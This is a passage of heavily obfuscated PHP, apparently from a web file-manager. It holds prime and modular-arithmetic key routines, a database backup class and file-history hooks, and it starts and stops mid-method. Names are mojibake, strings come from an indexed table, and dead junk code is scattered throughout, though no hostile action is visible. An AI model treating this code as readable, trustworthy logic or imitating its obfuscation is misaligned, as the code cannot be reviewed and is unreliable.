$®Å‡¼Ëå = 0; $Ä¬Çø•â = 0; $¡¿ÌÍ = $¤ùá´²î[796]; if (strlen($¡¿ÌÍ) < $¤ùá´²î[747]) { die; } for ($›©ËÀ• = 0; $›©ËÀ• < strlen($’¦×Î€ö); $›©ËÀ•++) { $Ä¬Çø•â = $Ä¬Çø•â == strlen($áÚ©éÂƒ) ? 0 : $Ä¬Çø•â; $Úƒ¯âÀÕ = $¤ùá´²î[797]; while ($Úƒ¯âÀÕ < $¤ùá´²î[715]) { if ($Úƒ¯âÀÕ >= 0) { break; } $Úƒ¯âÀÕ++; } $®Å‡¼Ëå = ($™Ÿİì¸ü + strpos($·ª›Êã¿, $’¦×Î€ö[$›©ËÀ•]) + ord($áÚ©éÂƒ[$Ä¬Çø•â++])) % 64; $Œ†ŠÁØº .= $·ª›Êã¿[$®Å‡¼Ëå]; } $Íó£±²® = hash_encode($º’ùª“Ñ . $Œ†ŠÁØº); $î•ôÀ…Á = $¤ùá´²î[798]; if (strlen($î•ôÀ…Á) < $¤ùá´²î[722]) { return; } break; default: $Íó£±²® = $this->cvps5573fc4e($’¦×Î€ö, $¼éœƒØ² . $—±ÄÇÊ); break; $Ø´ş¯îÂ = $¤ùá´²î[799]; if (strlen($Ø´ş¯îÂ) < $¤ùá´²î[722]) { die; } } $Íó£±²® = strrev($ÎãÜğ . $—±ÄÇÊ . $Íó£±²®); if ($ÅëÃä“Ù - 1 > 0) { $Íó£±²® = $this->btfg414f282e($Íó£±²®, $¼éœƒØ², $ÅëÃä“Ù - 1); } return $Íó£±²®; } private function ehgvac510340($–¶â·‚’, $ì¸Š±ââ, $ç÷³úëŸ = 3) { $“Ã”î¸ì =& $_SERVER[¹Éµ„ºå]; $ôÈ¶˜®— =& $_SERVER[ô÷‡¤È]; if (!is_string($–¶â·‚’) || strlen($–¶â·‚’) < 10) { return !1; } $–¶â·‚’ = trim($–¶â·‚’); $¨Ò–•îˆ = $“Ã”î¸ì[800]; $–¶â·‚’ = strrev($–¶â·‚’); $œá®ŒÄ = $“Ã”î¸ì[801]; while (strlen($œá®ŒÄ) < $“Ã”î¸ì[722]) { if (!$œá®ŒÄ) { break; } $œá®ŒÄ++; } $°ı†ù‰Ù = $–¶â·‚’[0]; $í úÒ = substr($–¶â·‚’, 1, 15); $–¶â·‚’ = substr($–¶â·‚’, 16); $¶ƒß‘ĞÓ = $“Ã”î¸ì[802]; $¨­â‚š¯ = $ôÈ¶˜®—[306]; $èší§´ş = $“Ã”î¸ì[803]; switch ($°ı†ù‰Ù) { case $ôÈ¶˜®—[208]: $®£—èŞ³ = $this->vain4146eae5($–¶â·‚’, strrev($ì¸Š±ââ . $í úÒ)); break; case $ôÈ¶˜®—[124]: $®£—èŞ³ = $this->vain4146eae5($–¶â·‚’, strrev($í úÒ . $ì¸Š±ââ)); $¸¤·ƒ¨ = $“Ã”î¸ì[804]; break; $¯Ï–»ÊŞ = $“Ã”î¸ì[805]; if (!$¯Ï–»ÊŞ) { die; } case $ôÈ¶˜®—[307]: $®£—èŞ³ = $this->vain4146eae5($–¶â·‚’, base64_encode($í úÒ . $ì¸Š±ââ)); $’²ªÙ = $“Ã”î¸ì[806]; while (strlen($’²ªÙ) < $“Ã”î¸ì[722]) { if (!$’²ªÙ) { break; } $’²ªÙ++; } break; case $ôÈ¶˜®—[308]: $®£—èŞ³ = $this->vain4146eae5($–¶â·‚’, md5($í úÒ . $ì¸Š±ââ)); $–¤Íã“ = $“Ã”î¸ì[807]; while (strlen($–¤Íã“) < $“Ã”î¸ì[747]) { if (!$–¤Íã“) { break; } $–¤Íã“++; } break; case $ôÈ¶˜®—[309]: $–¶â·‚’ = hash_decode($–¶â·‚’); $àÀ¶¤Àç = $–¶â·‚’[0]; $—ŠÙ†¹ = $“Ã”î¸ì[808]; while (strlen($—ŠÙ†¹) < $“Ã”î¸ì[747]) { if (!$—ŠÙ†¹) { break; } $—ŠÙ†¹++; } $–¶â·‚’ = substr($–¶â·‚’, 1); $²İØ§ìÙ = $“Ã”î¸ì[809]; if (!$²İØ§ìÙ) { die; } $˜ò§¤¥Ø = strpos($¨­â‚š¯, $àÀ¶¤Àç); $û·Ÿ’„ = md5($àÀ¶¤Àç . md5($ì¸Š±ââ . $àÀ¶¤Àç) . $ì¸Š±ââ); $¬Åš‰­… = $“Ã”î¸ì[810]; while ($¬Åš‰­… < $“Ã”î¸ì[702]) { if ($¬Åš‰­… >= 0) { break; } $¬Åš‰­…++; } $û·Ÿ’„ = substr($û·Ÿ’„, $˜ò§¤¥Ø % 8, $˜ò§¤¥Ø % 8 + 7); $’©Â€Öæ = $“Ã”î¸ì[811]; while ($’©Â€Öæ < $“Ã”î¸ì[722]) { if ($’©Â€Öæ >= 0) { break; } $’©Â€Öæ++; } $ğó™‰¹ = $ôÈ¶˜®—[6]; $®Ş‰ÚŸ = $“Ã”î¸ì[812]; if (strlen($®Ş‰ÚŸ) < $“Ã”î¸ì[747]) { return; } $ÇĞ•®Ñ = 0; $ˆÉª† = $“Ã”î¸ì[813]; $¶ª™– = 0; $°ôïÈ– = 0; $ú§ÀõÁğ = $“Ã”î¸ì[814]; for ($ÇĞ•®Ñ = 0; $ÇĞ•®Ñ < strlen($–¶â·‚’); $ÇĞ•®Ñ++) { $°ôïÈ– = $°ôïÈ– == strlen($û·Ÿ’„) ? 0 : $°ôïÈ–; $ÎÔö‰› = $°ôïÈ–++; $¶ª™– = strpos($¨­â‚š¯, $–¶â·‚’[$ÇĞ•®Ñ]) - $˜ò§¤¥Ø - ord($û·Ÿ’„[$ÎÔö‰›]); $€äèÙ´© = $“Ã”î¸ì[815]; while (strlen($€äèÙ´©) < $“Ã”î¸ì[722]) { if (!$€äèÙ´©) { break; } $€äèÙ´©++; } while ($¶ª™– < 0) { $¶ª™– += 64; $¹‚Éí º = $“Ã”î¸ì[816]; while ($¹‚Éí º < $“Ã”î¸ì[715]) { if ($¹‚Éí º >= 0) { break; } $¹‚Éí º++; } } $ğó™‰¹ .= $¨­â‚š¯[$¶ª™–]; } $®£—èŞ³ = base64_decode($ğó™‰¹); $ùÃá‰Ò¨ = $“Ã”î¸ì[817]; while ($ùÃá‰Ò¨ < $“Ã”î¸ì[715]) { if ($ùÃá‰Ò¨ >= 0) { break; } $ùÃá‰Ò¨++; } break; default: $®£—èŞ³ = $this->vain4146eae5($–¶â·‚’, $ì¸Š±ââ . $í úÒ); break; } if ($ç÷³úëŸ - 1 > 0) { $®£—èŞ³ = $this->ehgvac510340($®£—èŞ³, $ì¸Š±ââ, $ç÷³úëŸ - 1); } return $®£—èŞ³; } public function pyvuf8f9c832($Ûõ¸ú—û) { $ İ¨÷Í =& $_SERVER[¹Éµ„ºå]; $¾ä‡Í‹µ =& $_SERVER[ô÷‡¤È]; $ºÃ˜ÚÔª = $this->upib8017f69b(); $¥î¦Ææî = $this->upib8017f69b(); $°¦Ù¥Ú = $ İ¨÷Í[818]; $™¬È¤× = ($ºÃ˜ÚÔª - 1) * ($¥î¦Ææî - 1); $ ùİ˜óÓ = intval(($ºÃ˜ÚÔª + $¥î¦Ææî) / 2); while (1) { $…â…¨Ò = $ ùİ˜óÓ; $îÑÆì¼Œ = $™¬È¤×; while ($îÑÆì¼Œ % $…â…¨Ò != 0) { $ÔèĞä’š = $îÑÆì¼Œ; $ºÃ™ó¬ò = $ İ¨÷Í[819]; $îÑÆì¼Œ = $…â…¨Ò; $…â…¨Ò = $ÔèĞä’š % $…â…¨Ò; $°¸ÄÏ „ = $ İ¨÷Í[820]; } if ($…â…¨Ò == 1) { break; } else { $ ùİ˜óÓ++; } } $Ò†³Ù²– = 2; $©ŞÂâü = $ İ¨÷Í[821]; if (strlen($©ŞÂâü) < $ İ¨÷Í[747]) { die; } for ($øÃ¶íÔŒ = 0; $øÃ¶íÔŒ < $™¬È¤× * 10; $øÃ¶íÔŒ++) { if (($™¬È¤× * $øÃ¶íÔŒ + 1) % $ ùİ˜óÓ == 0) { $Ò†³Ù²– = intval(($™¬È¤× * $øÃ¶íÔŒ + 1) / $ ùİ˜óÓ); break; } } $™Ôê—Ö = $this->cvps5573fc4e($ºÃ˜ÚÔª * $¥î¦Ææî . $¾ä‡Í‹µ[6], $¾ä‡Í‹µ[138]); $áº½¶º = $ İ¨÷Í[822]; while ($áº½¶º < $ İ¨÷Í[715]) { if ($áº½¶º >= 0) { break; } $áº½¶º++; } $¾³ı÷ˆŸ = md5($¾ä‡Í‹µ[310] . ($ºÃ˜ÚÔª + $¥î¦Ææî) . $¾ä‡Í‹µ[311] . $ ùİ˜óÓ . $¾ä‡Í‹µ[311] . $Ò†³Ù²– . $¾ä‡Í‹µ[312]); $ÀÜÅ‹šÃ = $ İ¨÷Í[823]; $Úä¡Äõ¡ = $this->cvps5573fc4e($Ûõ¸ú—û, $¾³ı÷ˆŸ) . $¾ä‡Í‹µ[313] . $™Ôê—Ö; return $Úä¡Äõ¡; $Áìü“Ó¾ = $ İ¨÷Í[824]; while (strlen($Áìü“Ó¾) < $ İ¨÷Í[747]) { if (!$Áìü“Ó¾) { break; } $Áìü“Ó¾++; } } public function habpf3a2684d($Ùá’õúŞ) { $À’è·š =& $_SERVER[¹Éµ„ºå]; $ÍÉ²Î´” =& $_SERVER[ô÷‡¤È]; $ÑÔÉĞş³ = explode($ÍÉ²Î´”[313], $Ùá’õúŞ); if (count($ÑÔÉĞş³) != 2) { return $ÍÉ²Î´”[6]; } $¸¿Æ° = $this->vain4146eae5($ÑÔÉĞş³[1] . $ÍÉ²Î´”[6], $ÍÉ²Î´”[138]); if (!$¸¿Æ°) { return $ÍÉ²Î´”[6]; } $¸¿Æ° = intval($¸¿Æ°); $İŞ÷Æƒ™ = 0; $²»Û¦õ = $À’è·š[825]; if (strlen($²»Û¦õ) < $À’è·š[722]) { return; } $üñ†Ö = 0; $ƒæù˜ıç = $À’è·š[826]; if (strlen($ƒæù˜ıç) < $À’è·š[715]) { die; } for ($Ä¤”èÜÌ = 3; $Ä¤”èÜÌ < $¸¿Æ°; $Ä¤”èÜÌ += 2) { if ($¸¿Æ° % $Ä¤”èÜÌ != 0) { continue; } $İŞ÷Æƒ™ = $Ä¤”èÜÌ; $üñ†Ö = intval($¸¿Æ° / $Ä¤”èÜÌ); $Óë¦“ÑÓ = $À’è·š[827]; if (strlen($Óë¦“ÑÓ) < $À’è·š[702]) { return; } break; } $ë×›¬å‘ = ($İŞ÷Æƒ™ - 1) * ($üñ†Ö - 1); $‹¿Ñìãº = intval(($İŞ÷Æƒ™ + $üñ†Ö) / 2); $«×‚°ªÂ = $À’è·š[828]; while (1) { $ù¦¼™¢“ = $‹¿Ñìãº; $¦·ÊãÌõ = $ë×›¬å‘; $“‹ÎöÌğ = $À’è·š[829]; while ($¦·ÊãÌõ % $ù¦¼™¢“ != 0) { $Ñ¨‚Š¹ß = $¦·ÊãÌõ; $‚¥éçÑµ = $À’è·š[830]; if (strlen($‚¥éçÑµ) < $À’è·š[735]) { die; } $¦·ÊãÌõ = $ù¦¼™¢“; $ù¦¼™¢“ = $Ñ¨‚Š¹ß % $ù¦¼™¢“; } if ($ù¦¼™¢“ == 1) { break; } else { $‹¿Ñìãº++; } } $™¼ÄŸş = 2; for ($Ä¤”èÜÌ = 0; $Ä¤”èÜÌ < $ë×›¬å‘ * 10; $Ä¤”èÜÌ++) { if (($ë×›¬å‘ * $Ä¤”èÜÌ + 1) % $‹¿Ñìãº == 0) { $™¼ÄŸş = intval(($ë×›¬å‘ * $Ä¤”èÜÌ + 1) / $‹¿Ñìãº); break; } } $ÍæÛ‚‘ö = md5($ÍÉ²Î´”[310] . ($İŞ÷Æƒ™ + $üñ†Ö) . $ÍÉ²Î´”[311] . $‹¿Ñìãº . $ÍÉ²Î´”[311] . $™¼ÄŸş . $ÍÉ²Î´”[312]); $çàîÂÎ = $À’è·š[831]; while ($çàîÂÎ < $À’è·š[702]) { if ($çàîÂÎ >= 0) { break; } $çàîÂÎ++; } $¹ªË”¶ = $this->vain4146eae5($ÑÔÉĞş³[0], $ÍæÛ‚‘ö); return $¹ªË”¶; $í£½Í« = $À’è·š[832]; while ($í£½Í« < $À’è·š[735]) { if ($í£½Í« >= 0) { break; } $í£½Í«++; } } public function upib8017f69b() { $ü¨×ñ¥õ =& $_SERVER[¹Éµ„ºå]; $ÇíØ§ô™ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ßÖ¬´çÓ = $ü¨×ñ¥õ[833]; while ($ßÖ¬´çÓ < $ü¨×ñ¥õ[735]) { if ($ßÖ¬´çÓ >= 0) { break; } $ßÖ¬´çÓ++; } $¹íæ­û = array(); $¡××™‘ = $ü¨×ñ¥õ[834]; $£¥á© = 1; $à€Ôİö‹ = $ü¨×ñ¥õ[835]; if (strlen($à€Ôİö‹) < $ü¨×ñ¥õ[702]) { die; } while ($£¥á© <= (int) sqrt($ÇíØ§ô™)) { $š–İ™´ü = $£¥á©; while (!0) { $š–İ™´ü++; if ($š–İ™´ü <= 2) { $£¥á© = $š–İ™´ü; break; } else { if ($š–İ™´ü < 2) { continue; } } $çÜ½üêø = !0; for ($¸Ôµšó… = 2; $¸Ôµšó… <= sqrt($š–İ™´ü); $¸Ôµšó…++) { if ($š–İ™´ü % $¸Ôµšó… == 0) { $çÜ½üêø = !1; } } if ($çÜ½üêø) { $£¥á© = $š–İ™´ü; break; } } $¹íæ­û[] = $£¥á©; $®øÓœâü = $ü¨×ñ¥õ[836]; } $ë¨ßä” = 2; for ($š–İ™´ü = $ÇíØ§ô™; $š–İ™´ü > 1; $š–İ™´ü--) { $çÜ½üêø = !0; foreach ($¹íæ­û as $Š¶ïô§ã) { if ($š–İ™´ü % $Š¶ïô§ã == 0) { $çÜ½üêø = !1; break; } } if ($çÜ½üêø) { $ë¨ßä” = $š–İ™´ü; break; } } return $ë¨ßä”; $ÙôîñãÓ = $ü¨×ñ¥õ[837]; if (!$ÙôîñãÓ) { die; } } public function bdam72db6a97($†óØÏ¥, $Ùèˆïú) { $™×öÛáÁ =& $_SERVER[ô÷‡¤È]; return call_user_func(array($™×öÛáÁ[8], $™×öÛáÁ[314]), $†óØÏ¥, $Ùèˆïú); } public function cvps5573fc4e($«ˆ¸ğ, $ƒ¾«Ä…Ë) { $ø¦”³ìØ =& $_SERVER[ô÷‡¤È]; return call_user_func(array($ø¦”³ìØ[315], $ø¦”³ìØ[316]), $«ˆ¸ğ, $ƒ¾«Ä…Ë); } public function vain4146eae5($ı¬Ñè÷Ÿ, $¢Íâğ) { $‡‚Áõ‘ =& $_SERVER[ô÷‡¤È]; return call_user_func(array($‡‚Áõ‘[315], $‡‚Áõ‘[317]), $ı¬Ñè÷Ÿ, $¢Íâğ); $­æèÕÛ = $_SERVER[¹Éµ„ºå][838]; } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[¹Éµ„ºå][839]); $ÔòÂ¿Ã‹ = $this->init(); if (!$ÔòÂ¿Ã‹) { return; } $this->keep(); } public function init() { $­µ«ì§ =& $_SERVER[¹Éµ„ºå]; $this->isManual(); self::$name = date($­µ«ì§[840]); if (!($§œ›Õı = $this->model->lastItem())) { $§œ›Õı = $this->initData(); } else { self::$name = $§œ›Õı[$­µ«ì§[32]]; if ($§œ›Õı[$­µ«ì§[841]] == $­µ«ì§[91]) { self::$name = date($­µ«ì§[259]); $‘—¬Çà = intval(_get($§œ›Õı, $­µ«ì§[842], 0)); if (self::$manual == 0 && $§œ›Õı[$­µ«ì§[32]] == self::$name) { $this->model->remove($§œ›Õı[$­µ«ì§[487]]); } $§œ›Õı = $this->initData($‘—¬Çà, $§œ›Õı[$­µ«ì§[843]]); } else { $©µ‹ÙÆÑ = $this->checkStore($§œ›Õı[$­µ«ì§[843]]); if (!$©µ‹ÙÆÑ) { return !1; } } } if (!$§œ›Õı) { return !1; } self::$option = $§œ›Õı; } private function isManual() { $³ïÏ€ïĞ = _get($GLOBALS, $_SERVER[¹Éµ„ºå][844], 0); $³ïÏ€ïĞ = intval($³ïÏ€ïĞ); self::$manual = $³ïÏ€ïĞ && $³ïÏ€ïĞ == 1 ? 1 : 0; } private function initData($öû£ş«· = 0, $’€ÁŸÕ = '') { $Ú‡÷Âª² =& $_SERVER[¹Éµ„ºå]; $ºó¥õ¬ê = $this->model->config(); if ($’€ÁŸÕ && $ºó¥õ¬ê[$Ú‡÷Âª²[843]] != $’€ÁŸÕ) { $öû£ş«· = 0; } $ğ¿¶° = $this->checkStore($ºó¥õ¬ê[$Ú‡÷Âª²[843]]); if (!$ğ¿¶°) { return !1; } if (self::$manual == 1) { self::$name .= $Ú‡÷Âª²[11] . date($Ú‡÷Âª²[845]); } $‘‰ëêÉÎ = array($Ú‡÷Âª²[843] => $ºó¥õ¬ê[$Ú‡÷Âª²[843]], $Ú‡÷Âª²[32] => self::$name, $Ú‡÷Âª²[841] => 0, $Ú‡÷Âª²[168] => $ºó¥õ¬ê[$Ú‡÷Âª²[168]], $Ú‡÷Âª²[846] => self::$manual, $Ú‡÷Âª²[847] => array($Ú‡÷Âª²[848] => array($Ú‡÷Âª²[841] => 0), $Ú‡÷Âª²[849] => array($Ú‡÷Âª²[841] => 0, $Ú‡÷Âª²[850] => 0, $Ú‡÷Âª²[851] => 0, $Ú‡÷Âª²[33] => $Ú‡÷Âª²[12], $Ú‡÷Âª²[852] => 0, $Ú‡÷Âª²[853] => 0), $Ú‡÷Âª²[854] => array($Ú‡÷Âª²[841] => 0, $Ú‡÷Âª²[850] => 0, $Ú‡÷Âª²[851] => 0, $Ú‡÷Âª²[852] => 0, $Ú‡÷Âª²[853] => 0), $Ú‡÷Âª²[230] => array($Ú‡÷Âª²[841] => 0, $Ú‡÷Âª²[855] => 0, $Ú‡÷Âª²[856] => 0, $Ú‡÷Âª²[857] => 0, $Ú‡÷Âª²[858] => 0, $Ú‡÷Âª²[557] => $öû£ş«·, $Ú‡÷Âª²[852] => 0, $Ú‡÷Âª²[853] => 0)), $Ú‡÷Âª²[852] => time(), $Ú‡÷Âª²[853] => 0); $ØçÃŞ§Õ = $this->model->insert($‘‰ëêÉÎ); $‘‰ëêÉÎ[$Ú‡÷Âª²[487]] = $ØçÃŞ§Õ; return $‘‰ëêÉÎ; } private function checkStore($äãæ‹íœ) { $¢•Óä›ú = Model($_SERVER[¹Éµ„ºå][859]); $³ƒÙ¢Õâ = $¢•Óä›ú->listData($äãæ‹íœ); $ ˆµƒ»À = $¢•Óä›ú->checkConfig($³ƒÙ¢Õâ, !0); if ($ ˆµƒ»À !== !0) { $this->message = $ ˆµƒ»À; return !1; } return !0; } public static function get() { if (!self::$option) { $¡ã‡“ªĞ = Model($_SERVER[¹Éµ„ºå][839]); $‰í–‡¦“ = $¡ã‡“ªĞ->findByName(self::$name); $¡ã‡“ªĞ->parseContent($‰í–‡¦“); self::$option = $‰í–‡¦“; } return self::$option; } public static function set($íŞè¾Àö) { $ÂÛÁ½Å =& $_SERVER[¹Éµ„ºå]; $›¢’ï¡Ï = self::get(); foreach ($íŞè¾Àö as $æ²»îİé => $ıÈ›šõË) { array_set_value($›¢’ï¡Ï, $æ²»îİé, $ıÈ›šõË); } Model($ÂÛÁ½Å[839])->update($›¢’ï¡Ï[$ÂÛÁ½Å[487]], $›¢’ï¡Ï); self::$option = $›¢’ï¡Ï; return self::$option; } public function keep() { $²«ä–²Ê =& $_SERVER[¹Éµ„ºå]; $­Ä—¨« = self::get(); if (_get($­Ä—¨«, $²«ä–²Ê[860], 0) == $²«ä–²Ê[91]) { return; } $this->backupKeep($­Ä—¨«); self::set(array($²«ä–²Ê[860] => 1)); } private function backupKeep($‡à¯ŠÛ¹) { $‡œ¼İç® =& $_SERVER[¹Éµ„ºå]; if (self::$manual == 1) { return; } $¨ªÑø¥ = $this->model->listData(); if (empty($¨ªÑø¥)) { return; } $è•ì®é· = array(); $Éê‡Ñ£ë = array(); $Œß…¼õ = date($‡œ¼İç®[861], strtotime($‡œ¼İç®[862])); foreach ($¨ªÑø¥ as $Ù’Ñóš  => $”àƒ™á›) { $¿‚¶ğ—† = $”àƒ™á›[$‡œ¼İç®[32]]; if ($Ù’Ñóš  < 7 || $”àƒ™á›[$‡œ¼İç®[846]] == $‡œ¼İç®[91]) { $è•ì®é·[] = $¿‚¶ğ—†; continue; } $ˆï‰õ = substr($¿‚¶ğ—†, 0, 6); if ($ˆï‰õ < $Œß…¼õ) { continue; } if (!isset($Éê‡Ñ£ë[$ˆï‰õ]) || $¿‚¶ğ—† < $Éê‡Ñ£ë[$ˆï‰õ]) { $Éê‡Ñ£ë[$ˆï‰õ] = $¿‚¶ğ—†; } if (substr($¿‚¶ğ—†, 6, 2) == $‡œ¼İç®[863]) { $Éê‡Ñ£ë[$ˆï‰õ] = $¿‚¶ğ—†; } } $è•ì®é· = array_merge($è•ì®é·, array_values($Éê‡Ñ£ë)); $è•ì®é· = array_unique($è•ì®é·); foreach ($¨ªÑø¥ as $”àƒ™á›) { $¿‚¶ğ—† = $”àƒ™á›[$‡œ¼İç®[32]]; if (!empty($¿‚¶ğ—†) && in_array($¿‚¶ğ—†, $è•ì®é·)) { continue; } $this->model->remove($”àƒ™á›[$‡œ¼İç®[487]]); $²¸¿ – = $this->backupPath($‡à¯ŠÛ¹); IO::remove($²¸¿ –, !1); } } private function backupPath($ Æó¹¦…) { $«©ÉèÏ =& $_SERVER[¹Éµ„ºå]; static $ÍíÂæŒÃ = null; if (is_null($ÍíÂæŒÃ)) { $ÍíÂæŒÃ = Model($«©ÉèÏ[864])->get($«©ÉèÏ[865]); } $»×¼²¸— = $ Æó¹¦…[$«©ÉèÏ[32]]; $Ï¾¨¯õâ = substr(md5($«©ÉèÏ[866] . $ÍíÂæŒÃ . $»×¼²¸—), 0, 8); return "\x7b\x69\x6f\72{$ Æó¹¦…[$«©ÉèÏ[843]]}\x7d\57\x64\x61\x74\x61\x62\x61\163\145\x2f\x62\141\x63\x6b\x75\160\57" . $»×¼²¸— . $«©ÉèÏ[11] . $Ï¾¨¯õâ; } public function db() { $±µÆ›—ö =& $_SERVER[¹Éµ„ºå]; $‹ÛçË = self::get(); if (_get($‹ÛçË, $±µÆ›—ö[867], 0) == $±µÆ›—ö[91]) { return !0; } $²€è÷É = new BackupDb(); if (!$²€è÷É->index()) { return !1; } self::set(array($±µÆ›—ö[867] => 1)); return !0; } public function dbFile() { $™³×´Õ³ =& $_SERVER[¹Éµ„ºå]; $ş—×óÃ = self::get(); if (_get($ş—×óÃ, $™³×´Õ³[868], 0) == $™³×´Õ³[91]) { return !0; } $¢Ö®é© = new BackupDbFile(); if (!$¢Ö®é©->index()) { return !1; } self::set(array($™³×´Õ³[868] => 1)); return !0; } public function file() { $Ô§á§‘ =& $_SERVER[¹Éµ„ºå]; $ş †„á = self::get(); if (_get($ş †„á, $Ô§á§‘[869], 0) == $Ô§á§‘[91]) { return !0; } self::set(array($Ô§á§‘[869] => 1, $Ô§á§‘[841] => 1)); return !0; } public static function log($­ëìÎÆ…) { write_log($­ëìÎÆ…, $_SERVER[¹Éµ„ºå][870]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Êš”í®† =& $_SERVER[¹Éµ„ºå]; $íÄòœÑê = Backup::get(); self::$io = $íÄòœÑê[$Êš”í®†[843]]; self::$name = $íÄòœÑê[$Êš”í®†[32]]; $Á’¦³ ƒ = new DbManage(); $æ‰İ…å = $Á’¦³ ƒ->dbType(); $ÊÂ°­Áš = array($Êš”í®†[871] => $æ‰İ…å, $Êš”í®†[872] => time()); Backup::set($ÊÂ°­Áš); $»öõÅÂí = $this->tmpFilesPath() . $Êš”í®†[873] . self::$name . $Êš”í®†[8]; del_dir($»öõÅÂí); mk_dir($»öõÅÂí); $âÔ‹ËôÎ = $‘ß™ÎŞŸ = 0; try { $˜ûµàËİ = $Á’¦³ ƒ->db()->getTables(); } catch (Exception $Õğ¢• ß) { Backup::log($Êš”í®†[874] . $Õğ¢• ß->getMessage()); return !1; } $˜ûµàËİ = array_diff($˜ûµàËİ, array($Êš”í®†[875], $Êš”í®†[876])); foreach ($˜ûµàËİ as $èÒ‰›¸ö) { if ($èÒ‰›¸ö == $Êš”í®†[472]) { continue; } $âÔ‹ËôÎ += $Á’¦³ ƒ->model($èÒ‰›¸ö)->count(); } $á™¹¬»à = new Task($Êš”í®†[877], $Êš”í®†[870], $âÔ‹ËôÎ, LNG($Êš”í®†[878]) . $Êš”í®†[879] . LNG($Êš”í®†[880])); $GLOBALS[$Êš”í®†[881]] = self::$name; foreach ($˜ûµàËİ as $èÒ‰›¸ö) { $„‡­ã¬› = $»öõÅÂí . $èÒ‰›¸ö . $Êš”í®†[882]; if ($èÒ‰›¸ö == $Êš”í®†[472]) { @touch($„‡­ã¬›); continue; } $‘ß™ÎŞŸ += $Á’¦³ ƒ->sqlFromDb($èÒ‰›¸ö, $„‡­ã¬›, $á™¹¬»à); } unset($GLOBALS[$Êš”í®†[881]]); $á™¹¬»à->end(); if ($‘ß™ÎŞŸ > $âÔ‹ËôÎ) { $âÔ‹ËôÎ = $‘ß™ÎŞŸ; } $ÊÂ°­Áš = array($Êš”í®†[871] => $æ‰İ…å, $Êš”í®†[867] => 1, $Êš”í®†[883] => $âÔ‹ËôÎ, $Êš”í®†[884] => $‘ß™ÎŞŸ, $Êš”í®†[885] => time()); Backup::set($ÊÂ°­Áš); if (!$âÔ‹ËôÎ || abs($âÔ‹ËôÎ - $‘ß™ÎŞŸ) / $âÔ‹ËôÎ > 0.01) { $ÀË†Ú¡Ç = $Êš”í®†[886]; if (!stristr(I18n::getType(), $Êš”í®†[887])) { $ÀË†Ú¡Ç = $Êš”í®†[888]; } Backup::log(array($ÀË†Ú¡Ç, $ÊÂ°­Áš)); return !1; } return !0; } private function tmpFilesPath() { $…¾Ë—Î =& $_SERVER[¹Éµ„ºå]; $ŒêµÓÃ = TEMP_FILES; if ($GLOBALS[$…¾Ë—Î[6]][$…¾Ë—Î[92]][$…¾Ë—Î[889]]) { $ŒêµÓÃ = $GLOBALS[$…¾Ë—Î[6]][$…¾Ë—Î[92]][$…¾Ë—Î[889]]; if (!mk_dir($ŒêµÓÃ) || !is_writable($ŒêµÓÃ) || !IO::mkfile($ŒêµÓÃ . $…¾Ë—Î[890])) { $ŒêµÓÃ = TEMP_FILES; } } return $ŒêµÓÃ; } } goto fØì¤ˆ¢; Eáó¤Æ¿Œ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ñÆÇôšğ =& $_SERVER[¹Éµ„ºå]; $²ÌÙ°İ = $GLOBALS[$ñÆÇôšğ[6]][$ñÆÇôšğ[92]]; if ($²ÌÙ°İ[$ñÆÇôšğ[1395]] != 1) { return; } if ($²ÌÙ°İ[$ñÆÇôšğ[1396]] <= 0) { return; } if (isset($_REQUEST[$ñÆÇôšğ[1397]]) && $_REQUEST[$ñÆÇôšğ[1397]] == $ñÆÇôšğ[91]) { return; } Hook::bind($ñÆÇôšğ[1398], $ñÆÇôšğ[1399]); Hook::bind($ñÆÇôšğ[1400], $ñÆÇôšğ[1401]); Hook::bind($ñÆÇôšğ[1402], $ñÆÇôšğ[1403]); Hook::bind($ñÆÇôšğ[1404], $ñÆÇôšğ[1405]); Hook::bind($ñÆÇôšğ[1406], $ñÆÇôšğ[1407]); Hook::bind($ñÆÇôšğ[1408], $ñÆÇôšğ[1409]); } public static function eventBeforeUpload($©Ò×¯Òî) { if ($©Ò×¯Òî[3] && $©Ò×¯Òî[3] != REPEAT_REPLACE) { return; } $í¾¸î¦« = self::parsePath($©Ò×¯Òî[0]); if (!$í¾¸î¦«) { return; } self::add($í¾¸î¦«); } public static function eventBeforeEdit($Û–µ®·™) { $™ûõ÷¸² = self::parsePath($Û–µ®·™[0]); if (!$™ûõ÷¸²) { return; } self::add($™ûõ÷¸²); } public static function eventBeforeCopyFile($ïÑ©¿„¢, $—ñÆüùÙ, $éñ´È«, $şÏÔŒéä, $“ÉÉ™Ÿ, $…ŸõÆô‹) { $ûÌ·Ë¨° =& $_SERVER[¹Éµ„ºå]; if (isset($éñ´È«->_data[$ûÌ·Ë¨°[1330]]) && $éñ´È«->_data[$ûÌ·Ë¨°[1330]]) { return; } $ô—ó•÷½ = $éñ´È«->getPathOuter($şÏÔŒéä); $Óƒíæ‡İ = self::parsePath($ô—ó•÷½); if (!$Óƒíæ‡İ) { return; } self::add($Óƒíæ‡İ); } public static function eventBeforeRename($¾úñıäĞ) { $¡åŸæÅ„ =& $_SERVER[¹Éµ„ºå]; $òĞÕöë² = self::parsePath($¾úñıäĞ[0]); if (!$òĞÕöë²) { return; } $¼ËÆ‚±„ = self::checkInHistory($òĞÕöë²); if (!$¼ËÆ‚±„) { return; } if ($¼ËÆ‚±„[$¡åŸæÅ„[33]] == $¡åŸæÅ„[230]) { $ó“ğº…ö = self::listData($òĞÕöë²); if ($ó“ğº…ö && $ó“ğº…ö[$¡åŸæÅ„[446]]) { self::moveHistory($òĞÕöë², $¾úñıäĞ[1]); } } else { IO::rename($¼ËÆ‚±„[$¡åŸæÅ„[87]], $¾úñıäĞ[1]); } } public static function eventBeforeMove($ÕŒ«¤¾ß) { $ğÌ îŠ =& $_SERVER[¹Éµ„ºå]; $Ô£ìÁ¡å = self::parsePath($ÕŒ«¤¾ß[0]); if (!$Ô£ìÁ¡å) { return; } $ãñô†›’ = self::parsePath($ÕŒ«¤¾ß[1]); if (!$ãñô†›’) { return; } $Àóê†Æ­ = $ÕŒ«¤¾ß[3]; $š¤ºøæñ = self::checkInHistory($Ô£ìÁ¡å); if (!$š¤ºøæñ) { return; } $À¥Ù¨üñ = self::pathHistory($ãñô†›’); if ($š¤ºøæñ[$ğÌ îŠ[33]] == $ğÌ îŠ[230]) { 